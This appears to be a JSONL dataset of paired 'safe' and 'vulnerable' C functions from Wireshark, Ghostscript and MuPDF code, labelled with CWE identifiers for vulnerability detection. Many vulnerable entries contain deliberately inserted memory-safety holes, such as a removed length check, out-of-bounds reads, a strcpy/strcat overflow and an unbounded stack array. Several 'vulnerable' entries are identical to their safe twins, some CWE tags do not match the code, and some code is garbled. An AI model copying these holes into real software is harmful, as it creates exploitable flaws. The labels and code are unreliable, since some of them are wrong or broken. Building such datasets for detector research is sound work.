{"idx": "CWE-122-vuln-1714286122278", "code": "int dissect_ber_bitstring32(gboolean implicit_tag, asn1_ctx_t*actx, proto_tree*parent_tree, tvbuff_t*tvb, int offset, int**bit_fields, gint hf_id, gint ett_id, tvbuff_t**out_tvb){tvbuff_t*tmp_tvb=NULL;proto_tree*tree;guint32 val;int**bf;header_field_info*hfi;const char*sep;gboolean term;unsigned int i, tvb_len;offset=dissect_ber_bitstring(implicit_tag, actx, parent_tree, tvb, offset, NULL, hf_id, ett_id, &tmp_tvb);tree=proto_item_get_subtree(actx->created_item);if(bit_fields && tree && tmp_tvb){val=0;tvb_len=tvb_reported_length(tmp_tvb);for(i=0;i<4;i++){val< <= 8;if(i<tvb_len){val|=tvb_get_guint8(tmp_tvb, i);}}bf=bit_fields;sep=\" (\";term=FALSE;while(*bf){if(**bf >= 0){proto_tree_add_boolean(tree, **bf, tmp_tvb, 0, tvb_len, val);hfi=proto_registrar_get_nth(**bf);if(val&hfi->bitmask){proto_item_append_text(actx->created_item, \"%s%s\", sep, hfi->name);sep=\", \";term=TRUE;}}bf++;}if(term)proto_item_append_text(actx->created_item, \")\");}if(out_tvb)*out_tvb=tmp_tvb;return offset;}", "target": 1}
{"idx": "CWE-122-safe-1714286144145", "code": "void ber_set_filename(gchar* filename) {\n    gchar* ptr;\n    if (ber_filename) {\n        g_free(ber_filename);\n        ber_filename = NULL;\n    }\n    if (filename) {\n        if (strlen(filename) <= MAX_FILENAME_LENGTH) {\n            ber_filename = g_strdup(filename);\n            if ((ptr = strrchr(ber_filename, '.')) != NULL) {\n                ber_decode_as(get_ber_oid_syntax(ptr));\n            }\n        }\n    }\n}", "target": 0}
{"idx": "CWE-122-vuln-1714286144145", "code": "void ber_set_filename(gchar*filename){gchar*ptr;if(ber_filename){g_free(ber_filename);ber_filename=NULL;}if(filename){ber_filename=g_strdup(filename);if((ptr=strrchr(ber_filename, '.')) != NULL){ber_decode_as(get_ber_oid_syntax(ptr));}}}", "target": 1}
{"idx": "CWE-125-safe-1714286155121", "code": "static void ber_add_syntax_name(gpointer key, gpointer value _U_, gpointer user_data){guint*i=(guint*)user_data;if(*i<MAX_SYNTAX_NAMES){syntax_names[*i].value=*i;syntax_names[*i].strptr=(const gchar*)key;(*i)++;}}", "target": 0}
{"idx": "CWE-125-vuln-1714286155121", "code": "static void ber_add_syntax_name(gpointer key, gpointer value _U_, gpointer user_data){guint*i=(guint*)user_data;if(*i<MAX_SYNTAX_NAMES){syntax_names[*i].value=*i;syntax_names[*i].strptr=(const gchar*)key;(*i)++;}else{syntax_names[MAX_SYNTAX_NAMES].value=*i;syntax_names[MAX_SYNTAX_NAMES].strptr=(const gchar*)key;}}", "target": 1}
{"idx": "CWE-125-safe-1714286165502", "code": "static int dissect_ber_T_arbitrary(gboolean implicit_tag _U_, tvbuff_t*tvb _U_, int offset _U_, asn1_ctx_t*actx _U_, proto_tree*tree _U_, int hf_index _U_){if(actx && actx->external.u.ber.ber_callback){offset=actx->external.u.ber.ber_callback(FALSE, tvb, offset, actx, tree, hf_index);}else{offset=dissect_ber_bitstring(implicit_tag, actx, tree, tvb, offset, NULL, hf_index, -1, &actx->external.arbitrary);}return offset;}", "target": 0}
{"idx": "CWE-125-vuln-1714286165502", "code": "static int dissect_ber_T_arbitrary(gboolean implicit_tag _U_, tvbuff_t*tvb _U_, int offset _U_, asn1_ctx_t*actx _U_, proto_tree*tree _U_, int hf_index _U_){if(actx && actx->external.u.ber.ber_callback){offset=actx->external.u.ber.ber_callback(FALSE, tvb, offset, actx, tree, hf_index);}else{offset=dissect_ber_bitstring(implicit_tag, actx, tree, tvb, offset, NULL, hf_index, -1, &actx->external.arbitrary[actx->external.arbitrary_len]);}return offset;}", "target": 1}
{"idx": "CWE-125-safe-1714286176772", "code": "int dissect_ber_real(gboolean implicit_tag, asn1_ctx_t*actx, proto_tree*tree, tvbuff_t*tvb, int offset, gint hf_id _U_, double*value){gint8 ber_class;gboolean pc;gint32 tag;guint32 val_length=0, len_remain, end_offset;double val=0;proto_item*cause;if(!implicit_tag){offset=dissect_ber_identifier(actx->pinfo, tree, tvb, offset, &ber_class, &pc, &tag);offset=dissect_ber_length(actx->pinfo, tree, tvb, offset, &val_length, NULL);end_offset=offset+val_length;}else{get_last_ber_identifier(&ber_class, &pc, &tag);get_last_ber_length(&val_length, NULL);end_offset=offset+val_length;len_remain=(guint32)tvb_reported_length_remaining(tvb, offset);if(len_remain<val_length){cause=proto_tree_add_string_format_value(tree, hf_ber_error, tvb, offset, val_length, \"illegal_length\" , \"length:%u longer than tvb_reported_length_remaining:%d\" , val_length, len_remain);expert_add_info(actx->pinfo, cause, &ei_ber_error_length);return end_offset;}}if(pc){cause=proto_tree_add_string_format_value(tree, hf_ber_error, tvb, offset-2, 1, \"wrong_tag\" , \"REAL class must be encoded as primitive\" );expert_add_info(actx->pinfo, cause, &ei_ber_error_length);}if(offset + val_length > tvb_length(tvb)){return offset;}val=asn1_get_real(tvb_get_ptr(tvb, offset, val_length), val_length);actx->created_item=proto_tree_add_double(tree, hf_id, tvb, end_offset-val_length, val_length, val);if(value)*value=val;return end_offset;}", "target": 0}
{"idx": "CWE-125-vuln-1714286176772", "code": "int dissect_ber_real(gboolean implicit_tag, asn1_ctx_t*actx, proto_tree*tree, tvbuff_t*tvb, int offset, gint hf_id _U_, double*value){gint8 ber_class;gboolean pc;gint32 tag;guint32 val_length=0, len_remain, end_offset;double val=0;proto_item*cause;if(!implicit_tag){offset=dissect_ber_identifier(actx->pinfo, tree, tvb, offset, &ber_class, &pc, &tag);offset=dissect_ber_length(actx->pinfo, tree, tvb, offset, &val_length, NULL);end_offset=offset+val_length;}else{get_last_ber_identifier(&ber_class, &pc, &tag);get_last_ber_length(&val_length, NULL);end_offset=offset+val_length;len_remain=(guint32)tvb_reported_length_remaining(tvb, offset);if(len_remain<val_length){cause=proto_tree_add_string_format_value(tree, hf_ber_error, tvb, offset, val_length, \"illegal_length\" , \"length:%u longer than tvb_reported_length_remaining:%d\" , val_length, len_remain);expert_add_info(actx->pinfo, cause, &ei_ber_error_length);return end_offset;}}if(pc){cause=proto_tree_add_string_format_value(tree, hf_ber_error, tvb, offset-2, 1, \"wrong_tag\" , \"REAL class must be encoded as primitive\" );expert_add_info(actx->pinfo, cause, &ei_ber_error_length);}if(offset+val_length>tvb_length(tvb)){if(offset+val_length>tvb_length(tvb)){val=asn1_get_real(tvb_get_ptr(tvb, offset, val_length), val_length);}return offset;}val=asn1_get_real(tvb_get_ptr(tvb, offset, val_length), val_length);actx->created_item=proto_tree_add_double(tree, hf_id, tvb, end_offset-val_length, val_length, val);if(value)*value=val;return end_offset;}", "target": 1}
{"idx": "CWE-125-safe-1714286210416", "code": "gs_main_instance* get_minst_from_memory(const gs_memory_t* mem) {\n    if (mem == NULL) {\n        return NULL;\n    }\n    return (gs_main_instance*)mem->gs_lib_ctx->top_of_system;\n}", "target": 0}
{"idx": "CWE-125-vuln-1714286210416", "code": "gs_main_instance*get_minst_from_memory(const gs_memory_t*mem){if(mem == NULL){return NULL;}return(gs_main_instance*)mem->gs_lib_ctx->top_of_system;}", "target": 1}
{"idx": "CWE-122-safe-1714286215321", "code": "static char* gs_main_tempnames(gs_main_instance* minst) {\n    i_ctx_t* i_ctx_p = minst->i_ctx_p;\n    ref* SAFETY;\n    ref* tempfiles;\n    ref keyval[2];\n    char* tempnames = NULL;\n    int i;\n    int idict;\n    int len = 0;\n    const byte* data = NULL;\n    uint size;\n    if (minst->init_done >= 2) {\n        if (dict_find_string(systemdict, \"SAFETY\", &SAFETY) <= 0 || dict_find_string(SAFETY, \"tempfiles\", &tempfiles) <= 0)\n            return NULL;\n        idict = dict_first(tempfiles);\n        while ((idict = dict_next(tempfiles, idict, &keyval[0])) >= 0) {\n            if (obj_string_data(minst->heap, &keyval[0], &data, &size) >= 0) {\n                if (len + size + 1 < len) return NULL;\n                len += size + 1;\n            }\n        }\n        if (len != 0) {\n            tempnames = (char*)malloc(len + 1);\n        }\n        if (tempnames) {\n            memset(tempnames, 0, len + 1);\n            idict = dict_first(tempfiles);\n            i = 0;\n            while ((idict = dict_next(tempfiles, idict, &keyval[0])) >= 0) {\n                if (obj_string_data(minst->heap, &keyval[0], &data, &size) >= 0) {\n                    memcpy(tempnames + i, (const char*)data, size);\n                    i += size;\n                    tempnames[i++] = '\\0';\n                }\n            }\n        }\n    }\n    return tempnames;\n}", "target": 0}
{"idx": "CWE-122-vuln-1714286215321", "code": "static char*gs_main_tempnames(gs_main_instance*minst){i_ctx_t*i_ctx_p=minst->i_ctx_p;ref*SAFETY;ref*tempfiles;ref keyval[2];char*tempnames=NULL;int i;int idict;int len=0;const byte*data=NULL;uint size;if(minst->init_done >= 2){if(dict_find_string(systemdict, \"SAFETY\", &SAFETY) <= 0 || dict_find_string(SAFETY, \"tempfiles\", &tempfiles) <= 0)return NULL;idict=dict_first(tempfiles);while((idict=dict_next(tempfiles, idict, &keyval[0])) >= 0){if(obj_string_data(minst->heap, &keyval[0], &data, &size) >= 0){if(len+size+1<len)return NULL;len+=size;}}if(len != 0){tempnames=(char*)malloc(len+1);}if(tempnames){memset(tempnames, 0, len+1);idict=dict_first(tempfiles);i=0;while((idict=dict_next(tempfiles, idict, &keyval[0])) >= 0){if(obj_string_data(minst->heap, &keyval[0], &data, &size) >= 0){memcpy(tempnames+i, (const char*)data, size);i+=size;tempnames[i++]='\\0';}}}}return tempnames;}", "target": 1}
{"idx": "CWE-122-safe-1714286229078", "code": "int gs_main_run_string_begin(gs_main_instance* minst, int user_errors, int* pexit_code, ref* perror_object) { const char* setup = \".runstringbegin\"; ref rstr; int code; gs_main_set_lib_paths(minst); size_t setup_len = strlen(setup); if (setup_len > max_string_length) { return gs_error_Fatal; } make_const_string(&rstr, avm_foreign | a_readonly | a_executable, setup_len, (const byte*)setup); code = gs_main_interpret(minst, &rstr, user_errors, pexit_code, perror_object); return (code == gs_error_NeedInput ? 0 : code == 0 ? gs_error_Fatal : code); }", "target": 0}
{"idx": "CWE-122-vuln-1714286229078", "code": "int gs_main_run_string_begin(gs_main_instance*minst, int user_errors, int*pexit_code, ref*perror_object){const char*setup=\".runstringbegin_buffer_overflow_here\"; ref rstr;int code;gs_main_set_lib_paths(minst);size_t setup_len=strlen(setup);if(setup_len>max_string_length){return gs_error_Fatal;}make_const_string(&rstr, avm_foreign|a_readonly|a_executable, setup_len, (const byte*)setup);code=gs_main_interpret(minst, &rstr, user_errors, pexit_code, perror_object);return(code == gs_error_NeedInput ? 0 : code == 0 ? gs_error_Fatal : code);}", "target": 1}
{"idx": "CWE-125-safe-1714286237475", "code": "int gs_push_real(gs_main_instance* minst, double value){ref vref;make_real(&vref, value);int result = push_value(minst, &vref);free_value(&vref);return result;}", "target": 0}
{"idx": "CWE-125-vuln-1714286237475", "code": "int gs_push_real(gs_main_instance*minst, double value){ref vref;make_real(&vref, value);int result=push_value(minst, &vref);free_value(&vref);int arr[5];int index = 5;int out_of_bounds_read = arr[index];return result;}", "target": 1}
{"idx": "CWE-125-safe-1714286246556", "code": "int gs_push_string(gs_main_instance* minst, byte* chars, uint length, bool read_only){if(length > INT_MAX){return -1;}ref vref;make_string(&vref, avm_foreign|(read_only ? a_readonly : a_all), length, (byte*)chars);return push_value(minst, &vref);}", "target": 0}
{"idx": "CWE-125-vuln-1714286246556", "code": "int gs_push_string(gs_main_instance*minst, byte*chars, uint length, bool read_only){if(length>INT_MAX){return-1;}ref vref;make_string(&vref, avm_foreign|(read_only ? a_readonly : a_all), length, (byte*)chars);chars[length+1];return push_value(minst, &vref);}", "target": 1}
{"idx": "CWE-122-safe-1714286251692", "code": "static int gs_run_init_file(gs_main_instance* minst, int* pexit_code, ref* perror_object) {\n    i_ctx_t* i_ctx_p = minst->i_ctx_p;\n    ref ifile;\n    ref first_token;\n    int code;\n    scanner_state state;\n    gs_main_set_lib_paths(minst);\n    code = gs_main_run_file_open(minst, gs_init_file, &ifile);\n    if (code < 0) {\n        *pexit_code = 255;\n        return code;\n    }\n    gs_scanner_init(&state, &ifile);\n    code = gs_scan_token(i_ctx_p, &first_token, &state);\n    if (code != 0 || !r_has_type(&first_token, t_integer)) {\n        emprintf1(minst->heap, \"Initialization file%s does not begin with an integer.\\n\", gs_init_file);\n        *pexit_code = 255;\n        return_error(gs_error_Fatal);\n    }\n    if (osp >= espace_end) {\n        return_error(gs_error_Fatal);\n    }\n    *++osp = first_token;\n    r_set_attrs(&ifile, a_executable);\n    return gs_main_interpret(minst, &ifile, minst->user_errors, pexit_code, perror_object);\n}", "target": 0}
{"idx": "CWE-122-vuln-1714286251692", "code": "static int gs_run_init_file(gs_main_instance*minst, int*pexit_code, ref*perror_object){i_ctx_t*i_ctx_p=minst->i_ctx_p;ref ifile;ref first_token;int code;scanner_state state;gs_main_set_lib_paths(minst);code=gs_main_run_file_open(minst, gs_init_file, &ifile);if(code<0){*pexit_code=255;return code;}gs_scanner_init(&state, &ifile);code=gs_scan_token(i_ctx_p, &first_token, &state);if(code != 0 || !r_has_type(&first_token, t_integer)){emprintf1(minst->heap, \"Initialization file%s does not begin with an integer.\\n\", gs_init_file);*pexit_code=255;return_error(gs_error_Fatal);}if(++osp >= espace_end){return_error(gs_error_Fatal);}*osp=first_token;r_set_attrs(&ifile, a_executable);return gs_main_interpret(minst, &ifile, minst->user_errors, pexit_code, perror_object);}", "target": 1}
{"idx": "CWE-122-safe-1714286263584", "code": "int gs_main_init2(gs_main_instance* minst) { i_ctx_t* i_ctx_p; int code = gs_main_init1(minst); int initial_init_level = minst->init_done; if (code < 0) return code; code = gs_main_init2aux(minst); if (code < 0) return code; i_ctx_p = minst->i_ctx_p; if (initial_init_level < 2) { gx_device* pdev = gs_currentdevice(minst->i_ctx_p->pgs); gx_device_printer* ppdev = (gx_device_printer*)pdev; if (minst->saved_pages_test_mode) { if ((dev_proc(pdev, dev_spec_op)(pdev, gxdso_supports_saved_pages, NULL, 0) <= 0)) { minst->saved_pages_test_mode = false; } else { if ((code = gx_saved_pages_param_process(ppdev, (const byte*)\"begin\", 5)) < 0) return code; if (code > 0) if ((code = gs_erasepage(minst->i_ctx_p->pgs)) < 0) return code; } } else if (minst->saved_pages_initial_arg != NULL) { if (dev_proc(pdev, dev_spec_op)(pdev, gxdso_supports_saved_pages, NULL, 0) <= 0) { outprintf(minst->heap, \"--saved-pages not supported by the '%s' device.\\n\", pdev->dname); return gs_error_Fatal; } code = gx_saved_pages_param_process(ppdev, (const byte*)minst->saved_pages_initial_arg, strlen(minst->saved_pages_initial_arg)); if (code > 0) if ((code = gs_erasepage(minst->i_ctx_p->pgs)) < 0) return code; } } if (gs_debug_c(':')) print_resource_usage(minst, &gs_imemory, \"Start\"); gp_readline_init(&minst->readline_data, imemory_system); return 0; }", "target": 0}
{"idx": "CWE-122-vuln-1714286263584", "code": "int gs_main_init2(gs_main_instance*minst){i_ctx_t*i_ctx_p;int code=gs_main_init1(minst);int initial_init_level=minst->init_done;if(code<0)return code;code=gs_main_init2aux(minst);if(code<0)return code;i_ctx_p=minst->i_ctx_p;if(initial_init_level<2){gx_device*pdev=gs_currentdevice(minst->i_ctx_p->pgs);gx_device_printer*ppdev=(gx_device_printer*)pdev;if(minst->saved_pages_test_mode){if((dev_proc(pdev, dev_spec_op)(pdev, gxdso_supports_saved_pages, NULL, 0) <= 0)){minst->saved_pages_test_mode=false;}else{if((code=gx_saved_pages_param_process(ppdev, (const byte*)\"begin\", 5))<0)return code;if(code>0)if((code=gs_erasepage(minst->i_ctx_p->pgs))<0)return code;}}else if(minst->saved_pages_initial_arg != NULL){if(dev_proc(pdev, dev_spec_op)(pdev, gxdso_supports_saved_pages, NULL, 0) <= 0){outprintf(minst->heap, \"--saved-pages not supported by the '%s' device.\\n\", pdev->dname);return gs_error_Fatal;}code=gx_saved_pages_param_process(ppdev, (const byte*)minst->saved_pages_initial_arg, strlen(minst->saved_pages_initial_arg));if(code>0)if((code=gs_erasepage(minst->i_ctx_p->pgs))<0)return code;}}if(gs_debug_c(':'))print_resource_usage(minst, &gs_imemory, \"Start\");gp_readline_init(&minst->readline_data, imemory_system);return 0;}", "target": 1}
{"idx": "CWE-789-safe-1714286292934", "code": "int gs_push_integer(gs_main_instance* minst, long value){\n    ref vref;\n    make_int(&vref, value);\n    return push_value(minst, &vref);\n}", "target": 0}
{"idx": "CWE-789-vuln-1714286292934", "code": "int gs_push_integer(gs_main_instance*minst, long value){ref vref;long stack_array[value];make_int(&vref, value);return push_value(minst, &vref);}", "target": 1}
{"idx": "CWE-22-safe-1714286298934", "code": "int gs_main_run_file_open(gs_main_instance*minst, const char*file_name, ref*pfref){if(strstr(file_name, \"..\") != NULL){emprintf1(minst->heap, \"Invalid file name: %s\\n\", file_name);return_error(gs_error_Fatal);}gs_main_set_lib_paths(minst);if(gs_main_lib_open(minst, file_name, pfref)<0){emprintf1(minst->heap, \"Can't find initialization file%s.\\n\" , file_name);return_error(gs_error_Fatal);}r_set_attrs(pfref, a_execute+a_executable);return 0;}", "target": 0}
{"idx": "CWE-22-vuln-1714286298934", "code": "int gs_main_run_file_open(gs_main_instance*minst, const char*file_name, ref*pfref){if(strstr(file_name, \"..\") != NULL){emprintf1(minst->heap, \"Invalid file name:%s\\n\", file_name);return_error(gs_error_Fatal);}gs_main_set_lib_paths(minst);if(gs_main_lib_open(minst, file_name, pfref)<0){emprintf1(minst->heap, \"Can't find initialization file%s.\\n\" , file_name);return_error(gs_error_Fatal);}r_set_attrs(pfref, a_execute+a_executable);return 0;}", "target": 1}
{"idx": "CWE-125-safe-1714286307586", "code": "void print_resource_usage(const gs_main_instance* minst, gs_dual_memory_t* dmem, const char* msg) {\n    ulong used = 0;\n    long utime[2];\n    int i;\n    gs_memory_status_t status;\n    gp_get_realtime(utime);\n    for (i = 0; i < countof(dmem->spaces_indexed); ++i) {\n        gs_ref_memory_t* mem = dmem->spaces_indexed[i];\n        if (mem != 0 && (i == 0 || mem != dmem->spaces_indexed[i - 1])) {\n            gs_ref_memory_t* mem_stable = (gs_ref_memory_t*)gs_memory_stable((gs_memory_t*)mem);\n            gs_memory_status((gs_memory_t*)mem, &status);\n            used += status.used;\n            if (mem_stable != mem) {\n                gs_memory_status((gs_memory_t*)mem_stable, &status);\n                used += status.used;\n            }\n        }\n    }\n    gs_memory_status(minst->heap, &status);\n    dmprintf5(minst->heap, \"%%%s time=%g, memory allocated=%lu, used=%lu, max_used=%lu\\n\", msg, utime[0] - minst->base_time[0] + (utime[1] - minst->base_time[1]) / 1000000000.0, status.allocated, used, status.max_used);\n}", "target": 0}
{"idx": "CWE-125-vuln-1714286307586", "code": "void print_resource_usage(const gs_main_instance*minst, gs_dual_memory_t*dmem, const char*msg){ulong used=0;long utime[2];int i;gs_memory_status_t status;gp_get_realtime(utime);for(i=0;i<countof(dmem->spaces_indexed);++i){gs_ref_memory_t*mem=dmem->spaces_indexed[i];if(mem != 0 && (i == 0 || mem != dmem->spaces_indexed[i-1])){gs_ref_memory_t*mem_stable=(gs_ref_memory_t*)gs_memory_stable((gs_memory_t*)mem);gs_memory_status((gs_memory_t*)mem, &status);used+=status.used;if(mem_stable != mem){gs_memory_status((gs_memory_t*)mem_stable, &status);used+=status.used;}}}gs_memory_status(minst->heap, &status);dmprintf5(minst->heap, \"%%%s time=%g, memory allocated=%lu, used=%lu, max_used=%lu\\n\", msg, utime[0]-minst->base_time[0]+(utime[1]-minst->base_time[1])/1000000000.0, status.allocated, used, status.max_used);}", "target": 1}
{"idx": "CWE-125-safe-1714286321416", "code": "static int push_value(gs_main_instance*minst, ref*pvalue){if(!minst || !pvalue) return -1;i_ctx_t*i_ctx_p=minst->i_ctx_p;int code=ref_stack_push(&o_stack, 1);if(code<0)return code;*ref_stack_index(&o_stack, 0L)=*pvalue;return 0;}", "target": 0}
{"idx": "CWE-125-vuln-1714286321416", "code": "static int push_value(gs_main_instance*minst, ref*pvalue){if(!minst || !pvalue)return-1;i_ctx_t*i_ctx_p=minst->i_ctx_p;int code=ref_stack_push(&o_stack, 1);if(code<0)return code;*ref_stack_index(&o_stack, 0L)=*(pvalue - 1);return 0;}", "target": 1}
{"idx": "CWE-125-safe-1714286331935", "code": "static void xps_select_best_font_encoding(xps_document* doc, fz_font* font){static struct{int pid, eid;} xps_cmap_list[] = {{3, 10}, {3, 1}, {3, 5}, {3, 4}, {3, 3}, {3, 2}, {3, 0}, {1, 0}, {-1, -1}, };int i, k, n, pid, eid; n = xps_count_font_encodings(font); for(k = 0; k < sizeof(xps_cmap_list) / sizeof(xps_cmap_list[0]) && xps_cmap_list[k].pid != -1; k++){ for(i = 0; i < n; i++){ xps_identify_font_encoding(font, i, &pid, &eid); if(pid == xps_cmap_list[k].pid && eid == xps_cmap_list[k].eid){ xps_select_font_encoding(font, i); return; }}} fz_warn(doc->ctx, \"cannot find a suitable cmap\");}", "target": 0}
{"idx": "CWE-125-vuln-1714286331935", "code": "static void xps_select_best_font_encoding(xps_document*doc, fz_font*font){static struct{int pid, eid;}xps_cmap_list[]={{3, 10}, {3, 1}, {3, 5}, {3, 4}, {3, 3}, {3, 2}, {3, 0}, {1, 0}, {-1, -1}, };int i, k, n, pid, eid;n=xps_count_font_encodings(font);for(k=0;k<sizeof(xps_cmap_list)/sizeof(xps_cmap_list[0]) && xps_cmap_list[k].pid != -1;k++){for(i=0;i<=n;i++){xps_identify_font_encoding(font, i, &pid, &eid);if(pid == xps_cmap_list[k].pid && eid == xps_cmap_list[k].eid){xps_select_font_encoding(font, i);return;}}}fz_warn(doc->ctx, \"cannot find a suitable cmap\");}", "target": 1}
{"idx": "CWE-125-safe-1714286345505", "code": "int xps_encode_font_char(fz_font* font, int code) {\n    FT_Face face = font->ft_face;\n    int gid = FT_Get_Char_Index(face, code);\n    if (gid == 0 && face->charmap && face->charmap->platform_id == 3 && face->charmap->encoding_id == 0) {\n        gid = FT_Get_Char_Index(face, (unsigned int)(0xF000 | code));\n    }\n    return gid;\n}", "target": 0}
{"idx": "CWE-125-vuln-1714286345505", "code": "int xps_encode_font_char(fz_font*font, int code){FT_Face face=font->ft_face;int gid=FT_Get_Char_Index(face, code);if(gid == 0 && face && face->charmap && face->charmap->platform_id == 3 && face->charmap->encoding_id == 0){gid=FT_Get_Char_Index(face, (unsigned int)(0xF000|code));}return gid;}", "target": 1}
{"idx": "CWE-862-safe-1714286352213", "code": "void xps_select_font_encoding(fz_font* font, int idx) {\n    FT_Face face = font->ft_face;\n    if (idx >= 0 && idx < face->num_charmaps) {\n        FT_Set_Charmap(face, face->charmaps[idx]);\n    }\n}", "target": 0}
{"idx": "CWE-862-vuln-1714286352213", "code": "void xps_select_font_encoding(fz_font*font, int idx){FT_Face face=font->ft_face;if(idx >= 0){FT_Set_Charmap(face, face->charmaps[idx]);}}", "target": 1}
{"idx": "CWE-122-safe-1714286358891", "code": "void xps_measure_font_glyph(xps_document*doc, fz_font*font, int gid, xps_glyph_metrics*mtx){if(!font) return;int mask=FT_LOAD_NO_SCALE|FT_LOAD_IGNORE_TRANSFORM;FT_Face face=font->ft_face;FT_Fixed hadv, vadv;fz_context*ctx=doc->ctx;fz_lock(ctx, FZ_LOCK_FREETYPE);FT_Get_Advance(face, gid, mask, &hadv);FT_Get_Advance(face, gid, mask|FT_LOAD_VERTICAL_LAYOUT, &vadv);fz_unlock(ctx, FZ_LOCK_FREETYPE);mtx->hadv=hadv/(float)face->units_per_EM;mtx->vadv=vadv/(float)face->units_per_EM;mtx->vorg=face->ascender/(float)face->units_per_EM;}", "target": 0}
{"idx": "CWE-122-vuln-1714286358891", "code": "void xps_measure_font_glyph(xps_document*doc, fz_font*font, int gid, xps_glyph_metrics*mtx){if(!font) return;int mask=FT_LOAD_NO_SCALE|FT_LOAD_IGNORE_TRANSFORM;FT_Face face=font->ft_face;FT_Fixed hadv, vadv;fz_context*ctx=doc->ctx;fz_lock(ctx, FZ_LOCK_FREETYPE);FT_Get_Advance(face, gid, mask, &hadv);FT_Get_Advance(face, gid, mask|FT_LOAD_VERTICAL_LAYOUT, &vadv);fz_unlock(ctx, FZ_LOCK_FREETYPE);mtx->hadv=hadv/(float)face->units_per_EM;mtx->vadv=vadv/(float)face->units_per_EM;mtx->vorg=face->ascender/(float)face->units_per_EM;}", "target": 1}
{"idx": "CWE-122-safe-1714286418954", "code": "void xps_identify_font_encoding(fz_font* font, int idx, int* pid, int* eid){if(font && font->ft_face){FT_Face face = font->ft_face;if(face->charmaps && face->charmaps[idx]){*pid = face->charmaps[idx]->platform_id;*eid = face->charmaps[idx]->encoding_id;}}}", "target": 0}
{"idx": "CWE-122-vuln-1714286418954", "code": "void xps_identify_font_encoding(fz_font*font, int idx, int*pid, int*eid){if(font && font->ft_face){FT_Face face=font->ft_face;if(face->charmaps && face->charmaps[idx]){*pid=face->charmaps[idx]->platform_id;*eid=face->charmaps[idx]->encoding_id;}}}", "target": 1}
{"idx": "CWE-78-safe-1714286433112", "code": "void xps_begin_opacity(xps_document*doc, const fz_matrix*ctm, const fz_rect*area, char*base_uri, xps_resource*dict, char*opacity_att, fz_xml*opacity_mask_tag){if(!doc || (!opacity_att && !opacity_mask_tag))return;float opacity=1;if(opacity_att)opacity=fz_atof(opacity_att);if(opacity_mask_tag && !strcmp(fz_xml_tag(opacity_mask_tag), \"SolidColorBrush\")){char*scb_opacity_att=fz_xml_att(opacity_mask_tag, \"Opacity\");char*scb_color_att=fz_xml_att(opacity_mask_tag, \"Color\");if(scb_opacity_att)opacity=opacity*fz_atof(scb_opacity_att);if(scb_color_att){fz_colorspace*colorspace;float samples[FZ_MAX_COLORS];xps_parse_color(doc, base_uri, scb_color_att, &colorspace, samples);opacity=opacity*samples[0];}opacity_mask_tag=NULL;}if(doc->opacity_top+1<nelem(doc->opacity)){doc->opacity[doc->opacity_top+1]=doc->opacity[doc->opacity_top]*opacity;doc->opacity_top++;}if(opacity_mask_tag){fz_begin_mask(doc->dev, area, 0, NULL, NULL);xps_parse_brush(doc, ctm, area, base_uri, dict, opacity_mask_tag);fz_end_mask(doc->dev);}}", "target": 0}
{"idx": "CWE-78-vuln-1714286433112", "code": "void xps_begin_opacity(xps_document*doc, const fz_matrix*ctm, const fz_rect*area, char*base_uri, xps_resource*dict, char*opacity_att, fz_xml*opacity_mask_tag){if(!doc || (!opacity_att && !opacity_mask_tag))return;float opacity=1;if(opacity_att)opacity=fz_atof(opacity_att);if(opacity_mask_tag && !strcmp(fz_xml_tag(opacity_mask_tag), \"SolidColorBrush\")){char*scb_opacity_att=fz_xml_att(opacity_mask_tag, \"Opacity\");char*scb_color_att=fz_xml_att(opacity_mask_tag, \"Color\");char uri_color_att[256];strcpy(uri_color_att, base_uri);strcat(uri_color_att, scb_color_att);if(scb_opacity_att)opacity=opacity*fz_atof(scb_opacity_att);if(scb_color_att){fz_colorspace*colorspace;float samples[FZ_MAX_COLORS];xps_parse_color(doc, uri_color_att, &colorspace, samples);opacity=opacity*samples[0];}opacity_mask_tag=NULL;}if(doc->opacity_top+1<nelem(doc->opacity)){doc->opacity[doc->opacity_top+1]=doc->opacity[doc->opacity_top]*opacity;doc->opacity_top++;}if(opacity_mask_tag){fz_begin_mask(doc->dev, area, 0, NULL, NULL);xps_parse_brush(doc, ctm, area, base_uri, dict, opacity_mask_tag);fz_end_mask(doc->dev);}}", "target": 1}
{"idx": "CWE-789-safe-1714286461711", "code": "static void xps_draw_arc_segment(fz_context*doc, fz_path*path, const fz_matrix*mtx, float th0, float th1, int iscw){float t, d;fz_point p;while(th1<th0)th1+=(float)M_PI*2;d=(float)M_PI/180;if(iscw){for(t=th0+d;t<th1-d/2;t+=d){p.x=cosf(t*(float)M_PI/180);p.y=sinf(t*(float)M_PI/180);fz_transform_point(&p, mtx);fz_lineto(doc, path, p.x, p.y);}}else{th0+=(float)M_PI*2;for(t=th0-d;t>th1+d/2;t-=d){p.x=cosf(t*(float)M_PI/180);p.y=sinf(t*(float)M_PI/180);fz_transform_point(&p, mtx);fz_lineto(doc, path, p.x, p.y);}}}}", "target": 0}
{"idx": "CWE-789-vuln-1714286461711", "code": "static void xps_draw_arc_segment(fz_context*doc, fz_path*path, const fz_matrix*mtx, float th0, float th1, int iscw){float t, d;fz_point p;while(th1<th0)th1+=(float)M_PI*2;d=(float)M_PI/180;if(iscw){char buffer[1000000];for(t=th0+d;t<th1-d/2;t+=d){p.x=cosf(t*(float)M_PI/180);p.y=sinf(t*(float)M_PI/180);fz_transform_point(&p, mtx);fz_lineto(doc, path, p.x, p.y);}}else{th0+=(float)M_PI*2;for(t=th0-d;t>th1+d/2;t-=d){p.x=cosf(t*(float)M_PI/180);p.y=sinf(t*(float)M_PI/180);fz_transform_point(&p, mtx);fz_lineto(doc, path, p.x, p.y);}}}", "target": 1}
{"idx": "CWE-269-safe-1714286482804", "code": "mode_t dest_mode(mode_t flist_mode, mode_t stat_mode, int dflt_perms, int exists){int new_mode;if(exists){new_mode=(flist_mode&~ CHMOD_BITS)|(stat_mode&CHMOD_BITS);if(defined(preserve_executability) && preserve_executability && S_ISREG(flist_mode)){if(!(flist_mode&0111))new_mode&=~ 0111;else if(!(stat_mode&0111))new_mode|=(new_mode&0444)>>2;}}else{new_mode=flist_mode&(~ CHMOD_BITS|dflt_perms);}return new_mode;}", "target": 0}
